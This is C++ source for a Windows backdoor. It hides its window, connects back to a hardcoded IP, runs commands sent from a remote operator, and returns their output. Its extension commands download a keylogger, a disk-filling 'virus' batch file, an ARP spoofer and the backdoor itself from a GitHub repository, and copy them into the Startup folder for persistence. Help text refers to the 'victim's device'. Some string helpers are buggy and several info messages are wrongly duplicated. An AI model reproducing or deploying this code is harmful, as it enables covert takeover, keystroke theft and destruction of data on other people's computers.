
#ifdef _WIN32
#include <Windows.h>
#else
#include <unistd.h>
#endif
#include <iostream>
#include <fstream>
#include <WS2tcpip.h>
#include <unistd.h>
#include <cstdlib>

#pragma comment(lib, "ws2_32.lib")
using namespace std;

#define DEFAULT_BUFLEN 40690
#define DEFAULT_TOTALE_BUFLEN 651040
#define DEFAULT_PORT 27015

int sock;

string Additions(char *buffer);
// Extensions Function:
string CE_InfoExt(string buffer);
string CE_RunExt(string buffer);
string CE_StartupExt(string buffer);
string CE_StopExt(string buffer);

int strincludes(char *strVar, char *buffer);
char *strsub(char str[], int slice_from, int slice_to);

void download_file(char *filename);

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR pCmdLine, int nCmdShow)
{

    HWND stealth;

    AllocConsole();

    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 0);

    sockaddr_in ServAdrr;
    // unsigned short ServPort = DEFAULT_PORT;
    char ServIp[16] = "192.168.1.36";

    WSADATA wsaData;

    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
    {
        exit(1);
    }
tryc:
    sock = socket(AF_INET, SOCK_STREAM, 0);

    ZeroMemory(&ServAdrr, sizeof(ServAdrr));
    ServAdrr.sin_family = AF_INET;
    ServAdrr.sin_addr.S_un.S_addr = inet_addr(ServIp);
    ServAdrr.sin_port = htons(DEFAULT_PORT);

    // cout << "[+] - " << ServAdrr.sin_addr.S_un.S_addr << endl;

start:
    int resCon = connect(sock, (struct sockaddr *)&ServAdrr, sizeof(ServAdrr));
    while (resCon != 0)
    {
        sleep(10);
        cout << "Try to connection " << endl;
        goto start;
    }
    if (resCon == 0)
    {
        printf("[+] - Connected ^_^\n");
    }

    char buffer[DEFAULT_BUFLEN];
    char container[DEFAULT_BUFLEN];
    char total_response[DEFAULT_TOTALE_BUFLEN];

    cout << "[RECV]" << endl;

    while (true)
    {
    jumb:
        ZeroMemory(buffer, sizeof(buffer));
        ZeroMemory(container, sizeof(container));
        ZeroMemory(total_response, sizeof(total_response));

        // int bytesRecv = recv(sock, buffer, sizeof(buffer), 0);
        int bytesRecv = recv(sock, buffer, sizeof(buffer), 0);

        cout << "[CMD] - " << buffer << endl;

        if (bytesRecv == SOCKET_ERROR)
        {
            cerr << "[ERR] - Error in recv() ! . Quitting" << endl;
            goto tryc;
        }

        if (bytesRecv == 0)
        {
            cout << "[ERR] - Server disconnected " << endl;
            goto tryc;
        }

        cout << "[CMD] - " << buffer << endl;

        if (strncmp("q", buffer, 1) == 0)
        {
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else if (strncmp("cd ", buffer, 3) == 0)
        {
            chdir(strsub(buffer, 3, 100));
            // strcpy(total_response, strsub(buffer, 3, 100));
            send(sock, total_response, sizeof(total_response), 0);
        }
        else if (strncmp("download ", buffer, 9) == 0)
        {
            char *filename = strsub(buffer, 9, 100);
            // if (!filename) {

            // }
            // "@download -> file:filename.c; fdddddgfdgffddddddddddddhfghgf"
        }

        else
        {

            strcpy(buffer, Additions(buffer).c_str());

            FILE *fp;
            fp = _popen(buffer, "rt");
            while (fgets(container, 4096, fp))
            {
                strcat(total_response, container);
            }
            if (feof(fp))
            {

                printf("[TRES] - %s\n", total_response);
                send(sock, total_response, sizeof(total_response), 0);

                _pclose(fp);
            }
        }
    }
}

// void download_file(char *filename)
// {

//     char lineData[DEFAULT_BUFLEN];
//     char fileData[DEFAULT_TOTALE_BUFLEN];
//     char response_err[DEFAULT_TOTALE_BUFLEN];

//     if (!filename)
//     {
//         strcpy(response_err, "please input valid filename");
//         send(sock, response_err, sizeof(response_err), 0);
//         return;
//     }

//     fstream fp;
//     fp.open(filename, ios::in);

//     while (fp >> lineData)
//     {
//         strcat(fileData, lineData);
//     }

//     send(sock, fileData, sizeof(fileData), 0);

//     return;
// }

string Additions(char *buffer)
{

    string obuf = buffer;

    if (obuf.find("apps_list ") != string::npos)
    {
        if (obuf.find("info") != string::npos)
        {
            obuf = "echo [APPLIST] [INFO] - This command allows you to view all the applications installed on the victim's device as well as those that are currently running";
        }
        else if (obuf.find("run") != string::npos)
        {
            if (obuf.find("all") != string::npos)
            {
                obuf = "powershell -Command \"Get-Process | Format-Table Handles,NPM,PM,WS,CPU,Id,SI,ProcessName,Name,Mainwindowtitle -AutoSize\"";
            }
            else
            {
                obuf = "powershell -Command \"Get-Process | Where-Object { $_.MainWindowTitle } | Format-Table Handles,NPM,PM,WS,CPU,Id,SI,ProcessName,Name,Mainwindowtitle -AutoSize\"";
            }
        }
        else if (obuf.find("all") != string::npos)
        {
            obuf = "powershell -Command \"Get-AppxPackage\"";
        }
    }
    else if (obuf.find("ext ") != string::npos)
    {
        if (obuf.find("info") != string::npos)
        {
            obuf = CE_InfoExt(obuf);
        }
        else if (obuf.find("run") != string::npos)
        {
            obuf = CE_RunExt(obuf);
        }
        else if (obuf.find("startup") != string::npos)
        {
            obuf = CE_StartupExt(obuf);
        }
        else if (obuf.find("stop") != string::npos)
        {
            obuf = CE_StopExt(obuf);
        }
    }
    return obuf;
}

/*
######################################
            Extensions
######################################
*/
string CE_InfoExt(string buffer)
{
    string ebuf = buffer;
    if (ebuf.find("keylog") != string::npos)
    {
        ebuf = "echo [EXT] [INFO] - This extension is built in C++ language and it logs all mouse and keyboard events and makes them available in C:\\ProgramData\\Ms\\log.txt file. And the keylogger.exe file is in C:\\ProgramData\\Ms All events will be added to the file cumulatively, you can delete it if you want to re-registration, or you can use the following command: $ ext reset keylog ";
        ebuf += " && echo. && echo [ $ ] - Available Commands : ";
        ebuf += " && echo [ $ ext run keylog ] -  for start recording ";
        ebuf += " && echo [ $ ext info keylog ] - show some info for keylog extension ";
        ebuf += " && echo [ $ ext reset keylog ] - delete keylog file :  C:\\ProgramData\\Ms\\log.txt ";
    }
    else if (ebuf.find("fill_storage") != string::npos)
    {
        ebuf = "echo [EXT] [INFO] - This extension is built in betch, This add-on fills the device with large files and is created very quickly so that the storage capacity of the device can be filled in three seconds, and you can also make it more dangerous by copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup . So that it works automatically when you startup the device ";
        ebuf += " && echo. && echo [ $ ] - Available Commands : ";
        ebuf += " && echo [ $ ext run fill_storage ] -  for start fill storage ";
        ebuf += " && echo [ $ ext startup fill_storage ] - copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup ";
        ebuf += " && echo [ $ ext info fill_storage ] - show some info for fill_storage extension ";
    }
    else if (ebuf.find("nmap") != string::npos)
    {
        ebuf = "echo [EXT] [INFO] - This extension is built in betch, This add-on fills the device with large files and is created very quickly so that the storage capacity of the device can be filled in three seconds, and you can also make it more dangerous by copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup . So that it works automatically when you startup the device ";
        ebuf += " && echo. && echo [ $ ] - Available Commands : ";
        ebuf += " && echo [ $ ext run nmap ] -  for download & make it ready for run ";
        ebuf += " && echo [ $ C:\\ProgramData\\Ms\\Nmap\\nmap ] -  for start nmap ";
        ebuf += " && echo [ $ ext info nmap ] - show some info for nmap extension ";
    }
    else if (ebuf.find("arp_spoof") != string::npos)
    {
        ebuf = "echo [EXT] [INFO] - This extension is built in betch, This add-on fills the device with large files and is created very quickly so that the storage capacity of the device can be filled in three seconds, and you can also make it more dangerous by copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup . So that it works automatically when you startup the device ";
        ebuf += " && echo. && echo [ $ ] - Available Commands : ";
        ebuf += " && echo [ $ ext run arp_spoof ] -  for download and make it ready for run ";
        ebuf += " && echo [ $ C:\\ProgramData\\Ms\\arp_spoof\\arp_spoof.py ] -  for start arp_spoof ";
        ebuf += " && echo [ $ ext info arp_spoof ] - show some info for arp_spoof extension ";
    }
    else
    {
        ebuf = "echo [EXT] [INFO] - The extensions are based on multiple languages and different functions that achieve what the hacker wants to control the victim's device in a simple and fast way && echo Available extensions : && echo -- keylog && echo -- fill_storage && echo -- networks_profile && echo -- nmap && echo -- arp_spoof";
    }

    return ebuf;
}

string CE_RunExt(string buffer)
{
    string ebuf = buffer;

    string command = "IF NOT EXIST C:\\ProgramData ( mkdir C:\\ProgramData ) ELSE ( echo; ) && IF NOT EXIST C:\\ProgramData\\Ms ( mkdir C:\\ProgramData\\Ms ) ELSE ( echo; ) ";
    string default_commad = command;

    if (ebuf.find("keylog") != string::npos)
    {
        command += " && echo. && echo [EXT] [DOWNLOAD] - keylogextension in C:\\ProgramData\\Ms\\keylogger.exe && echo [EXT] [RUN] - keylog extension .. && echo. ";
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/keylogger.exe -o C:\\ProgramData\\Ms\\keylogger.exe && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( start C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo; ) ";
    }
    if (ebuf.find("nmap") != string::npos)
    {
        command += " && echo. && echo [EXT] [DOWNLOAD] - Nmap extension in C:\\ProgramData\\Ms\\Nmap && echo [EXT] [RUN] - C:\\ProgramData\\Ms\\Nmap\\nmap && echo. ";
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/Nmap.zip -o C:\\ProgramData\\Ms\\Nmap.zip && IF EXIST C:\\ProgramData\\Ms\\Nmap.zip ( powershell -Command \"Expand-Archive -Path \"C:\\ProgramData\\Ms\\Nmap.zip\" -DestinationPath \"C:\\ProgramData\\Ms\"\" ) ELSE ( echo; ) ";
    }
    if (ebuf.find("arp_spoof") != string::npos)
    {
        command += " && echo. && echo [EXT] [DOWNLOAD] - arp_spoof extension in C:\\ProgramData\\Ms\\arp_spoof && echo [EXT] [RUN] - C:\\ProgramData\\Ms\\arp_spoof\\arp_spoof.py && echo.";
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/arp_spoof.zip -o C:\\ProgramData\\Ms\\arp_spoof.zip && IF EXIST C:\\ProgramData\\Ms\\arp_spoof.zip ( powershell -Command \"Expand-Archive -Path \"C:\\ProgramData\\Ms\\arp_spoof.zip\" -DestinationPath \"C:\\ProgramData\\Ms\"\" ) ELSE ( echo; ) ";
    }
    if (ebuf.find("networks_profile") != string::npos)
    {
        command += " && echo. && echo [EXT] [DOWNLOAD] - networks_profile extension in C:\\ProgramData\\Ms\\networks_profile.exe && echo [EXT] [RUN] - networks_profile extension .. && echo.";
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/networks_profile.exe -o C:\\ProgramData\\Ms\\networks_profile.exe && IF EXIST C:\\ProgramData\\Ms\\networks_profile.exe ( start C:\\ProgramData\\Ms\\networks_profile.exe ) ELSE ( echo; ) ";
    }
    if (ebuf.find("fill_storage") != string::npos)
    {
        command += " && echo [EXT] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms && echo [EXT] [RUN] - fill_storage extension .. && echo.";
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o C:\\ProgramData\\Ms\\fill_storage_move.bat && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o C:\\ProgramData\\Ms\\fill_storage_virus.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_move.bat ( start C:\\ProgramData\\Ms\\fill_storage_move.bat ) ELSE ( echo; ) ";
    }
    if (ebuf.find("test_virus") != string::npos)
    {
        command += " && echo [EXT] [DOWNLOAD] - test [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms && echo [EXT] [RUN] - test_virus extension .. && echo.";

        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/test_move.bat -o C:\\ProgramData\\Ms\\test_move.bat && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/test_virus.bat -o C:\\ProgramData\\Ms\\test_virus.bat ";
        if (ebuf.find("run") != string::npos)
        {
            command += " && IF EXIST C:\\ProgramData\\Ms\\test_move.bat ( start C:\\ProgramData\\Ms\\test_move.bat ) ELSE ( echo; ) ";
        }
    }

    if (default_commad == command)
    {
        ebuf = "echo [EXT] [ERR] - You must use a valid extension name !";
    }
    else
    {
        ebuf = command;
    }

    return ebuf;
}
//powershell -Command Expand-Archive -Path 'Nmap.zip' -DestinationPath '.'

string CE_StartupExt(string buffer)
{
    string ebuf = buffer;

    string command = "IF NOT EXIST C:\\ProgramData ( mkdir C:\\ProgramData ) ELSE ( echo; ) && IF NOT EXIST C:\\ProgramData\\Ms ( mkdir C:\\ProgramData\\Ms ) ELSE ( echo; ) ";
    string default_commad = command;

    if (ebuf.find("keylog") != string::npos)
    {
        command += " && echo. && echo [EXT] [DOWNLOAD] - keylogextension in C:\\ProgramData\\Ms\\keylogger.exe && echo [EXT] [RUN] - keylog extension .. && echo. ";

        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/keylogger.exe -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe\"";
        if (ebuf.find("run") != string::npos)
        {
            command += " && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe\" ) ELSE ( echo; ) ";
        }
    }
    else if (ebuf.find("fill_storage") != string::npos)
    {
        command += " && echo [EXT] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms && echo [EXT] [RUN] - fill_storage extension .. && echo.";

        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_virus.bat\" ";
        if (ebuf.find("run") != string::npos)
        {
            command += " && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ) ELSE ( echo; ) ";
        }
    }
    else if (ebuf.find("test_virus") != string::npos)
    {
        command += " && echo [EXT] [DOWNLOAD] - test [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms && echo [EXT] [RUN] - test_virus extension .. && echo.";

        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/test_move.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test_move.bat\" && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/test_virus.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test_virus.bat\" ";
        if (ebuf.find("run") != string::npos)
        {
            command += " && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.bat\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test_move.bat\" ) ELSE ( echo; ) ";
        }
    }

    if (default_commad == command)
    {
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/backdoor.exe -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.exe\"";
    }

    ebuf = command;

    return ebuf;
}

string CE_StopExt(string buffer)
{
    string ebuf = buffer;
    if (ebuf.find("keylog") != string::npos)
    {
        ebuf = "powershell -Command \"Stop-Process -Name \"keylogger\"\" && powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\ProgramData\\Ms\\keylogger.exe\"} | Stop-Process -WhatIf\"";
    }
    else if (ebuf.find("fill_storage") != string::npos)
    {
        ebuf = "powershell -Command \"Stop-Process -Name \"fill_storage_virus\"\" && powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\ProgramData\\Ms\\fill_storage_virus.bat\"} | Stop-Process -WhatIf\"";
    }
    // else if (ebuf.find("networks_profile") != string::npos)
    // {
    //     ebuf = "powershell -Command \"Stop-Process -Name \"networks_profile\"\" && powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\ProgramData\\Ms\\networks_profile.exe\"} | Stop-Process -WhatIf\"";
    // }

    else if (ebuf.find("arp_spoof") != string::npos)
    {
        ebuf = "powershell -Command \"Stop-Process -Name \"arp_spoof\"\" && powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\ProgramData\\Ms\\arp_spoof.exe\"} | Stop-Process -WhatIf\"";
    }

    return ebuf;
}

int strincludes(char *strVar, char *buffer)
{
    char *str;
    strcpy(str, strVar);
    if (!str)
        return 0;

    //  char *buffer_len = strlen(buffer);

    char *token = strtok(str, " ");
    while (token != NULL)
    {
        printf("%s --- %s\n", buffer, token);
        if (strcmp(buffer, token) == 0)
        {
            return 1;
        }
        token = strtok(NULL, " ");
    }
    return 0;
}

char *strsub(char str[], int slice_from, int slice_to)
{
    if (!str[slice_from + 1])
    {
        return NULL;
    }

    char *buffer;
    size_t str_len, buffer_len;
    if (slice_to < 0 && slice_from > slice_to)
    {
        str_len = strlen(str);
        if (abs(slice_to) > str_len - 1)
        {
            return NULL;
        }

        if (abs(slice_from) > str_len)
        {
            return NULL;
        }

        buffer_len = slice_to - slice_from;
        str += (str_len + slice_from);
    }
    else if (slice_from >= 0 && slice_to > slice_from)
    {
        str_len = strlen(str);

        if (slice_from > str_len - 1)
        {
            return NULL;
        }

        buffer_len = slice_to - slice_from;
        str += slice_from;
    }

    // buffer = calloc(buffer_len, sizeof(char));
    strncpy(buffer, str, buffer_len);
    return buffer;
}
